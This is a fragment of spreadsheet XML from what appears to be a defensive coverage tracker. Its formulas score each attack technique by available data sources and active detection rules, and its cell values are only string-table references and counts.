      <c r="D508" t="s">
        <v>2420</v>
      </c>
      <c r="E508" t="s">
        <v>2421</v>
      </c>
      <c r="F508" s="9">
        <f t="shared" si="7"/>
        <v>7</v>
      </c>
      <c r="G508" s="9" cm="1">
        <f t="array" ref="G508">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H508" s="9" cm="1">
        <f t="array" ref="H508">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>13</v>
      </c>
      <c r="I508" s="9" t="str" cm="1">
        <f t="array" ref="I508">IF(SUM(IF($C508=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C508=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J508" s="9" cm="1">
        <f t="array" ref="J50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508" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>13</v>
      </c>
      <c r="M508" s="9" cm="1">
        <f t="array" ref="M508">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>13</v>
      </c>
      <c r="N508" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O508" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P508" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S50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08" t="s">
        <v>368</v>
      </c>
      <c r="U508" t="s">
        <v>2422</v>
      </c>
      <c r="V508" t="s">
        <v>2423</v>
      </c>
      <c r="W508" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="509" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A509" t="s">
        <v>2419</v>
      </c>
      <c r="B509" t="s">
        <v>2424</v>
      </c>
      <c r="C509" t="s">
        <v>2425</v>
      </c>
      <c r="D509" t="s">
        <v>2420</v>
      </c>
      <c r="E509" t="s">
        <v>2426</v>
      </c>
      <c r="F509" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G509" s="9" cm="1">
        <f t="array" ref="G509">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H509" s="9" t="str" cm="1">
        <f t="array" ref="H509">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I509" s="9" t="str" cm="1">
        <f t="array" ref="I509">IF(SUM(IF($C509=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C509=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J509" s="9" t="str" cm="1">
        <f t="array" ref="J50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09" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M509" s="9" cm="1">
        <f t="array" ref="M509">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N509" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O509" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P509" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S50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09" t="s">
        <v>386</v>
      </c>
      <c r="U509" t="s">
        <v>2427</v>
      </c>
      <c r="V509" t="s">
        <v>2428</v>
      </c>
      <c r="W509" t="b">
        <v>1</v>
      </c>
      <c r="X509" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="510" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A510" t="s">
        <v>2419</v>
      </c>
      <c r="B510" t="s">
        <v>2429</v>
      </c>
      <c r="C510" t="s">
        <v>2430</v>
      </c>
      <c r="D510" t="s">
        <v>2420</v>
      </c>
      <c r="E510" t="s">
        <v>2431</v>
      </c>
      <c r="F510" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G510" s="9" cm="1">
        <f t="array" ref="G510">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H510" s="9" t="str" cm="1">
        <f t="array" ref="H510">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I510" s="9" t="str" cm="1">
        <f t="array" ref="I510">IF(SUM(IF($C510=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C510=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J510" s="9" t="str" cm="1">
        <f t="array" ref="J51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10" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M510" s="9" cm="1">
        <f t="array" ref="M510">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N510" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O510" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P510" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S51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10" t="s">
        <v>386</v>
      </c>
      <c r="U510" t="s">
        <v>2432</v>
      </c>
      <c r="V510" t="s">
        <v>2433</v>
      </c>
      <c r="W510" t="b">
        <v>1</v>
      </c>
      <c r="X510" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="511" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A511" t="s">
        <v>2419</v>
      </c>
      <c r="B511" t="s">
        <v>2434</v>
      </c>
      <c r="C511" t="s">
        <v>2435</v>
      </c>
      <c r="D511" t="s">
        <v>2420</v>
      </c>
      <c r="E511" t="s">
        <v>2426</v>
      </c>
      <c r="F511" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G511" s="9" cm="1">
        <f t="array" ref="G511">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H511" s="9" t="str" cm="1">
        <f t="array" ref="H511">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I511" s="9" t="str" cm="1">
        <f t="array" ref="I511">IF(SUM(IF($C511=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C511=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J511" s="9" t="str" cm="1">
        <f t="array" ref="J51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11" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M511" s="9" cm="1">
        <f t="array" ref="M511">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N511" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O511" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P511" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S51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11" t="s">
        <v>658</v>
      </c>
      <c r="U511" t="s">
        <v>2436</v>
      </c>
      <c r="V511" t="s">
        <v>2437</v>
      </c>
      <c r="W511" t="b">
        <v>1</v>
      </c>
      <c r="X511" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="512" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A512" t="s">
        <v>2419</v>
      </c>
      <c r="B512" t="s">
        <v>2438</v>
      </c>
      <c r="C512" t="s">
        <v>2439</v>
      </c>
      <c r="D512" t="s">
        <v>2420</v>
      </c>
      <c r="E512" t="s">
        <v>2440</v>
      </c>
      <c r="F512" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G512" s="9" cm="1">
        <f t="array" ref="G512">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H512" s="9" t="str" cm="1">
        <f t="array" ref="H512">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I512" s="9" t="str" cm="1">
        <f t="array" ref="I512">IF(SUM(IF($C512=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C512=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J512" s="9" t="str" cm="1">
        <f t="array" ref="J51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12" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M512" s="9" cm="1">
        <f t="array" ref="M512">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N512" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O512" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P512" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S51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12" t="s">
        <v>386</v>
      </c>
      <c r="U512" t="s">
        <v>2441</v>
      </c>
      <c r="V512" t="s">
        <v>2442</v>
      </c>
      <c r="W512" t="b">
        <v>1</v>
      </c>
      <c r="X512" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="513" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A513" t="s">
        <v>2419</v>
      </c>
      <c r="B513" t="s">
        <v>2443</v>
      </c>
      <c r="C513" t="s">
        <v>2444</v>
      </c>
      <c r="D513" t="s">
        <v>2420</v>
      </c>
      <c r="E513" t="s">
        <v>2445</v>
      </c>
      <c r="F513" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G513" s="9" cm="1">
        <f t="array" ref="G513">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H513" s="9" t="str" cm="1">
        <f t="array" ref="H513">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I513" s="9" t="str" cm="1">
        <f t="array" ref="I513">IF(SUM(IF($C513=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C513=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J513" s="9" t="str" cm="1">
        <f t="array" ref="J51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13" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M513" s="9" cm="1">
        <f t="array" ref="M513">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N513" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O513" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P513" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S51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13" t="s">
        <v>503</v>
      </c>
      <c r="U513" t="s">
        <v>2446</v>
      </c>
      <c r="V513" t="s">
        <v>2447</v>
      </c>
      <c r="W513" t="b">
        <v>1</v>
      </c>
      <c r="X513" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="514" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A514" t="s">
        <v>2419</v>
      </c>
      <c r="B514" t="s">
        <v>2448</v>
      </c>
      <c r="C514" t="s">
        <v>2449</v>
      </c>
      <c r="D514" t="s">
        <v>2420</v>
      </c>
      <c r="E514" t="s">
        <v>2450</v>
      </c>
      <c r="F514" s="9">
        <f t="shared" ref="F514:F577" si="8">LEN(E514)-LEN(SUBSTITUTE(E514,",",""))+1</f>
        <v>3</v>
      </c>
      <c r="G514" s="9" cm="1">
        <f t="array" ref="G514">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H514" s="9" t="str" cm="1">
        <f t="array" ref="H514">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I514" s="9" t="str" cm="1">
        <f t="array" ref="I514">IF(SUM(IF($C514=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C514=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J514" s="9" t="str" cm="1">
        <f t="array" ref="J51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14" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M514" s="9" cm="1">
        <f t="array" ref="M514">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N514" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O514" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P514" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S51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14" t="s">
        <v>368</v>
      </c>
      <c r="U514" t="s">
        <v>2451</v>
      </c>
      <c r="V514" t="s">
        <v>2452</v>
      </c>
      <c r="W514" t="b">
        <v>1</v>
      </c>
      <c r="X514" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="515" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A515" t="s">
        <v>2419</v>
      </c>
      <c r="B515" t="s">
        <v>2453</v>
      </c>
      <c r="C515" t="s">
        <v>2454</v>
      </c>
      <c r="D515" t="s">
        <v>2420</v>
      </c>
      <c r="E515" t="s">
        <v>1886</v>
      </c>
      <c r="F515" s="9">
        <f t="shared" si="8"/>
        <v>3</v>
      </c>
      <c r="G515" s="9" cm="1">
        <f t="array" ref="G515">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H515" s="9" t="str" cm="1">
        <f t="array" ref="H515">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I515" s="9" t="str" cm="1">
        <f t="array" ref="I515">IF(SUM(IF($C515=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C515=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J515" s="9" t="str" cm="1">
        <f t="array" ref="J51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15" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M515" s="9" cm="1">
        <f t="array" ref="M515">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N515" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O515" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P515" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S51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15" t="s">
        <v>386</v>
      </c>
      <c r="U515" t="s">
        <v>2455</v>
      </c>
      <c r="V515" t="s">
        <v>2456</v>
      </c>
      <c r="W515" t="b">
        <v>1</v>
      </c>
      <c r="X515" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="516" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A516" t="s">
        <v>2419</v>
      </c>
      <c r="B516" t="s">
        <v>2457</v>
      </c>
      <c r="C516" t="s">
        <v>2458</v>
      </c>
      <c r="D516" t="s">
        <v>2420</v>
      </c>
      <c r="E516" t="s">
        <v>1886</v>
      </c>
      <c r="F516" s="9">
        <f t="shared" si="8"/>
        <v>3</v>
      </c>
      <c r="G516" s="9" cm="1">
        <f t="array" ref="G516">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H516" s="9" t="str" cm="1">
        <f t="array" ref="H516">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I516" s="9" t="str" cm="1">
        <f t="array" ref="I516">IF(SUM(IF($C516=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C516=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J516" s="9" t="str" cm="1">
        <f t="array" ref="J51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16" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M516" s="9" cm="1">
        <f t="array" ref="M516">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N516" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O516" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P516" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S51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16" t="s">
        <v>386</v>
      </c>
      <c r="U516" t="s">
        <v>2459</v>
      </c>
      <c r="V516" t="s">
        <v>2452</v>
      </c>
      <c r="W516" t="b">
        <v>1</v>
      </c>
      <c r="X516" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="517" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A517" t="s">
        <v>2419</v>
      </c>
      <c r="B517" t="s">
        <v>2460</v>
      </c>
      <c r="C517" t="s">
        <v>2461</v>
      </c>
      <c r="D517" t="s">
        <v>2420</v>
      </c>
      <c r="E517" t="s">
        <v>2462</v>
      </c>
      <c r="F517" s="9">
        <f t="shared" si="8"/>
        <v>4</v>
      </c>
      <c r="G517" s="9" cm="1">
        <f t="array" ref="G517">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H517" s="9" t="str" cm="1">
        <f t="array" ref="H517">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I517" s="9" t="str" cm="1">
        <f t="array" ref="I517">IF(SUM(IF($C517=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C517=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J517" s="9" t="str" cm="1">
        <f t="array" ref="J51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17" s="9">
